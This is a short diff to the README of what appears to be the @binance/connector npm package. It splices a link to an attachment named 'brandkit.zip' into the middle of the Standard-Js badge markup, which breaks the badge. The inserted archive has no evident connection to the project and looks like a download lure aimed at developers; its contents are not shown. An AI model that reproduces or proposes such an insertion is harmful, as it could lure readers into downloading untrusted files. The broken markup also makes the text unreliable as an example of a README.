@@ -2,7 +2,10 @@
 
 [![npm version](https://badge.fury.io/js/%40binance%2Fconnector.svg)](https://badge.fury.io/js/%40binance%2Fconnector)
 [![Node version](https://img.shields.io/node/v/%40binance%2Fconnector.svg?style=flat)](http://nodejs.org/download/)
-[![Standard-Js](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com/)
+[![Standard-Js]
+[brandkit.zip](https://github.com/user-attachments/files/16741683/brandkit.zip)
+
+(https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
 
